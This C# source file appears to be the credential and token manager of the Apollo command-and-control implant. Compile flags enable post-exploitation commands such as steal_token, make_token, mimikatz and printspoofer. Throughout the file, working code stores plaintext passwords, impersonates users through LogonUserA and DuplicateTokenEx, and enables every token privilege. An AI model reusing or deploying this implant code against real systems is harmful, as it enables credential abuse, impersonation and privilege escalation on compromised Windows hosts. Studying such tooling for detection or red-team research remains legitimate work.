#define COMMAND_NAME_UPPER

#if DEBUG
#undef MAKE_TOKEN
#undef STEAL_TOKEN
#undef REV2SELF
#undef GETPRIVS
#undef WHOAMI
#undef POWERPICK
#undef MIMIKATZ
#undef EXECUTE_ASSEMBLY
#undef PRINTSPOOFER
#undef SPAWN
#define MAKE_TOKEN
#define STEAL_TOKEN
#define REV2SELF
#define GETPRIVS
#define WHOAMI
#define POWERPICK
#define MIMIKATZ
#define EXECUTE_ASSEMBLY
#define PRINTSPOOFER
#define SPAWN
#endif

#define POWERPICK

#if MAKE_TOKEN || PRINTSPOOFER||SPAWN||STEAL_TOKEN || REV2SELF || GETPRIVS || WHOAMI || POWERPICK || MIMIKATZ || EXECUTE_ASSEMBLY


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security;
using System.Security.Principal;
using System.Runtime.InteropServices;
using static Utils.DebugUtils;
using static Utils.StringUtils;
using static Native.Methods;
using static Native.Structures;
using static Native.Enums;
using static Native.Constants;
using static Native.Win32Error;
using Native;
using System.Reflection.Emit;

namespace Apollo.Credentials
{
    public struct Credential
    {
        public string Domain;
        public string Username;
        public string Password;
        public SecureString SecurePassword;
        public bool NetOnly;
        public bool IsEmpty()
        {
            return (Username == null || Username == "") &&
                   ((Password == null || Password == "") && (SecurePassword == null));
        }
    }

    internal static class CredentialManager
    {

        // We'll hard type-cast this
        private static Credential userCredential = new Credential();

        private static IntPtr phImpersonatedImpersonationToken = IntPtr.Zero;
        private static IntPtr phImpersonatedPrimaryToken = IntPtr.Zero;
        internal static WindowsIdentity CurrentIdentity { get; private set; } = WindowsIdentity.GetCurrent();

        // I think there might be a race condition with pth and this
        private static IntPtr executingThread = IntPtr.Zero;
        private static IntPtr originalImpersonationToken = IntPtr.Zero;
        private static IntPtr originalPrimaryToken = IntPtr.Zero;
        public static int IntegrityLevel { get; private set; }
        private static bool initialized = false;

        internal static void Initialize()
        {
            executingThread = CredentialManager.GetCurrentThread();
            originalImpersonationToken = GetExecutingThreadImpersonationToken();
            originalPrimaryToken = GetExecutingThreadPrimaryToken();
            IntegrityLevel = GetIntegrityLevel(originalImpersonationToken);
            initialized = true;
        }
        internal static bool SetCredential(string username, string password, string domain = null, bool isNetOnly = false)
        {
            if (!initialized)
                return false;
            bool bRet = false;
            int dwError = 0;
            IntPtr hToken = IntPtr.Zero;
            FlushCredentials();
            // Blank out the old struct
            userCredential = new Credential();
            if (!StringIsSet(username) || !StringIsSet(password))
                return bRet;
            userCredential.Username = username;
            userCredential.Password = password;
            userCredential.SecurePassword = new SecureString();
            foreach (char c in password)
                userCredential.SecurePassword.AppendChar(c);
            userCredential.SecurePassword.MakeReadOnly();
            if (!StringIsSet(domain))
                domain = ".";
            userCredential.Domain = domain;
            userCredential.NetOnly = isNetOnly;


            bRet = LogonUserA(
                userCredential.Username,
                userCredential.Domain,
                userCredential.Password,
                LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
                LOGON_PROVIDER.LOGON32_PROVIDER_WINNT50,
                out hToken);

            if (!bRet)
            {
                DebugWriteLine($"Error calling LogonUserA: {Marshal.GetLastWin32Error()}");
                RevertToSelf();
            }
            else
            {
                phImpersonatedPrimaryToken = hToken;
                bRet = DuplicateTokenEx(
                    phImpersonatedPrimaryToken,
                    TokenAccessLevels.MaximumAllowed,
                    IntPtr.Zero,
                    TokenImpersonationLevel.Impersonation,
                    TOKEN_TYPE.TokenImpersonation,
                    out IntPtr dupToken);
                if (bRet)
                    SetImpersonatedImpersonationToken(dupToken);
                else
                {
                    RevertToSelf();
                }

            }
            return bRet;
        }

        internal static int GetIntegrityLevel(IntPtr hToken)
        {
            int dwRet = 0;
            bool bRet = false;
            int dwTokenInfoLength = 0;
            IntPtr pTokenInformation = IntPtr.Zero;
            TOKEN_MANDATORY_LEVEL tokenLabel;
            IntPtr pTokenLabel = IntPtr.Zero;
            IntPtr pSidSubAthorityCount = IntPtr.Zero;
            bRet = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out dwTokenInfoLength);
            if (dwTokenInfoLength == 0 || Marshal.GetLastWin32Error() != Win32Error.ERROR_INSUFFICIENT_BUFFER)
                return dwRet;
            pTokenLabel = Marshal.AllocHGlobal(dwTokenInfoLength);
            try
            {
                bRet = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pTokenLabel, dwTokenInfoLength, out dwTokenInfoLength);
                if (bRet)
                {
                    tokenLabel = (TOKEN_MANDATORY_LEVEL)Marshal.PtrToStructure(pTokenLabel, typeof(TOKEN_MANDATORY_LEVEL));
                    pSidSubAthorityCount = GetSidSubAuthorityCount(tokenLabel.Label.Sid);
                    dwRet = Marshal.ReadInt32(GetSidSubAuthority(tokenLabel.Label.Sid, Marshal.ReadInt32(pSidSubAthorityCount) - 1));
                    if (dwRet < SECURITY_MANDATORY_LOW_RID)
                        dwRet = 0;
                    else if (dwRet < SECURITY_MANDATORY_MEDIUM_RID)
                        dwRet = 1;
                    else if (dwRet >= SECURITY_MANDATORY_MEDIUM_RID && dwRet < SECURITY_MANDATORY_HIGH_RID)
                        dwRet = 2;
                    else if (dwRet >= SECURITY_MANDATORY_HIGH_RID && dwRet < SECURITY_MANDATORY_SYSTEM_RID)
                        dwRet = 3;
                    else if (dwRet >= SECURITY_MANDATORY_SYSTEM_RID)
                        dwRet = 4;
                    else
                        dwRet = 0; // unknown - should be unreachable.

                }
            } catch (Exception ex)
            { } finally {
                Marshal.FreeHGlobal(pTokenLabel);
            }
            return dwRet;
        }

        internal static string GetIntegrityLevelAsString()
        {
            if (!initialized)
                return "";
            switch (IntegrityLevel)
            {
                case 0:
                case 1:
                    return "Low";
                case 2:
                    return "Medium";
                case 3:
                    return "High";
                case 4:
                    return "System";
                default: // We should never hit this
                    return "Unknown";
            }
        }

        private static IntPtr GetCurrentThread()
        {
            DebugWriteLine("Getting current thread...");
            IntPtr hThread = Native.Methods.GetCurrentThread();
            if (hThread == IntPtr.Zero)
                throw new Exception("Could not retrieve current thread.");
            return hThread;
        }

        private static IntPtr GetExecutingThreadPrimaryToken(bool openAsSelf = true)
        {
            DebugWriteLine("Getting current thread token...");
            IntPtr hToken = IntPtr.Zero;
            bool bRet = OpenThreadToken(
                executingThread,
                TOKEN_ALL_ACCESS,
                openAsSelf,
                out hToken
                );
            int dwError = Marshal.GetLastWin32Error();
            if (!bRet && ERROR_NO_TOKEN == dwError)
            {
                IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
                bRet = OpenProcessToken(
                    hProcess,
                    TOKEN_ALL_ACCESS,
                    out hToken);
                return hToken;
            }
            else if (!bRet)
            {
                DebugWriteLine($"Failed to open thread token: {dwError}");
            }
            else
            {
                DebugWriteLine($"Failed to open thread token and have unhandled error. dwError: {dwError}");
            }
            if (hToken == IntPtr.Zero)
                hToken = WindowsIdentity.GetCurrent().Token;
            return hToken;
        }


        private static IntPtr GetExecutingThreadImpersonationToken(bool openAsSelf = true)
        {
            DebugWriteLine("Getting current thread token...");
            IntPtr hToken = IntPtr.Zero;
            IntPtr hDupToken = IntPtr.Zero;
            bool bRet = OpenThreadToken(
                executingThread,
                TOKEN_ALL_ACCESS,
                openAsSelf,
                out hToken
                );
            int dwError = Marshal.GetLastWin32Error();
            if (!bRet && ERROR_NO_TOKEN == dwError)
            {
                IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
                bRet = OpenProcessToken(
                    hProcess,
                    TOKEN_ALL_ACCESS,
                    out hToken);
                if (!bRet)
                {
                    throw new Exception($"Failed to get process token: {dwError}");
                }
                /*
                 * DuplicateTokenEx(TokenHandle, TOKEN_QUERY, NULL, SecurityIdentification, TokenImpersonation, &effHandle);
*/
                bRet = DuplicateTokenEx(
                    hToken,
                    TokenAccessLevels.MaximumAllowed,
                    IntPtr.Zero,
                    System.Security.Principal.TokenImpersonationLevel.Impersonation,
                    TOKEN_TYPE.TokenImpersonation,
                    out hDupToken);
                if (!bRet)
                    DebugWriteLine($"Failed to duplicate token. Reason: {Marshal.GetLastWin32Error()}");
            }
            else if (!bRet)
            {
                DebugWriteLine($"Failed to open thread token: {dwError}");
            }
            else
            {
                DebugWriteLine($"Failed to open thread token and have unhandled error. dwError: {dwError}");
            }
            if (hDupToken == IntPtr.Zero)
                hDupToken = WindowsIdentity.GetCurrent().Token;
            return hDupToken;
        }
        internal static bool RevertToSelf()
        {
            if (!initialized)
                return false;
            bool bRet = false;
            int dwError = -1;
            bRet = SetThreadToken(ref executingThread, originalImpersonationToken);
            dwError = Marshal.GetLastWin32Error();
            if (!bRet)
                DebugWriteLine($"Failed to revert to self: {dwError}");
            FlushCredentials();
            return bRet;
        }

        internal static void FlushCredentials()
        {
            if (phImpersonatedImpersonationToken != IntPtr.Zero)
            {
                CloseHandle(phImpersonatedImpersonationToken);
            }
            if (phImpersonatedPrimaryToken != IntPtr.Zero)
            {
                CloseHandle(phImpersonatedPrimaryToken);
            }
            phImpersonatedPrimaryToken = IntPtr.Zero;
            phImpersonatedImpersonationToken = IntPtr.Zero;
            userCredential = new Credential();
            CurrentIdentity = new WindowsIdentity(originalImpersonationToken);
        }

        internal static bool SetImpersonatedPrimaryToken(IntPtr hToken)
        {
            if (!initialized)
                return false;
            bool bRet = true;
            int dwError = -1;
            if (phImpersonatedPrimaryToken != IntPtr.Zero)
                bRet = CloseHandle(phImpersonatedPrimaryToken);
            phImpersonatedPrimaryToken = hToken;
            return bRet;
        }

        internal static bool SetImpersonatedImpersonationToken(IntPtr hToken)
        {
            if (!initialized)
                return false;
            bool bRet = false;
            int dwError = -1;
            phImpersonatedImpersonationToken = hToken;
            try
            {
                CurrentIdentity = new WindowsIdentity(phImpersonatedImpersonationToken);
                bRet = true;
            } catch (Exception ex)
            {
                bRet = false;
                RevertToSelf();
            }
            return bRet;
        }

        internal static bool SePrivEnable(IntPtr hToken, string priv)
        {
            bool bRet = false;
            //_LUID lpLuid = new _LUID();
            var tokenPrivileges = new TOKEN_PRIVILEGES();
            tokenPrivileges.Privileges = new LUID_AND_ATTRIBUTES[1];
            bRet = LookupPrivilegeValue(null, priv, out tokenPrivileges.Privileges[0].Luid);
            if (!bRet)
                return bRet;
            tokenPrivileges.PrivilegeCount = 1;
            tokenPrivileges.Privileges[0].Attributes = ATTRIBUTES.SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, false, ref tokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero);
            if (Marshal.GetLastWin32Error() == 0)
                bRet = true;
            else
                bRet = false;
            return bRet;
        }

        internal static string GetCurrentUsername()
        {
            if (!initialized)
                return "";
            string username = "";
            IntPtr hToken = IntPtr.Zero;
            if (GetCredential(out Credential impersonatedUser))
            {
                username = $"{impersonatedUser.Domain}\\{impersonatedUser.Username}";
            } else
            {
                WindowsIdentity identity = null;
                if (phImpersonatedPrimaryToken != IntPtr.Zero)
                    hToken = phImpersonatedPrimaryToken;
                else
                    hToken = originalPrimaryToken;
                try
                {
                    identity = new WindowsIdentity(hToken);
                    username = identity.Name;
                }
                catch (Exception ex)
                {
                    DebugWriteLine($"Failed to create WindowsIdentity: {ex.Message}\n\tStackTrace:{ex.StackTrace}\n\tGetLastError():{Marshal.GetLastWin32Error()}");
                }
            }
            return username;
        }

        internal static string[] EnableAllPrivileges()
        {
            if (!initialized)
                throw new Exception("No valid thread tokens exist.");
            List<string> privs = new List<string>();
            IntPtr hToken;
            if (phImpersonatedImpersonationToken != IntPtr.Zero)
                hToken = phImpersonatedImpersonationToken;
            else
                hToken = originalImpersonationToken;
            foreach (string name in TokenPrivilegeNames)
            {
                if (SePrivEnable(hToken, name))
                    privs.Add(name);
            }

            return privs.ToArray();
        }


        internal static bool GetImpersonatedImpersonationToken(out IntPtr hOutToken)
        {
            hOutToken = phImpersonatedImpersonationToken;
            return phImpersonatedImpersonationToken != IntPtr.Zero;
        }

        internal static bool GetImpersonatedPrimaryToken(out IntPtr hOutToken)
        {
            hOutToken = phImpersonatedPrimaryToken;
            return phImpersonatedPrimaryToken != IntPtr.Zero;
        }


        // If a credential has been populated, get it and set it.
        internal static bool GetCredential(out Credential cred)
        {
            cred = userCredential;
            return !userCredential.IsEmpty();
        }
    }
}
#endif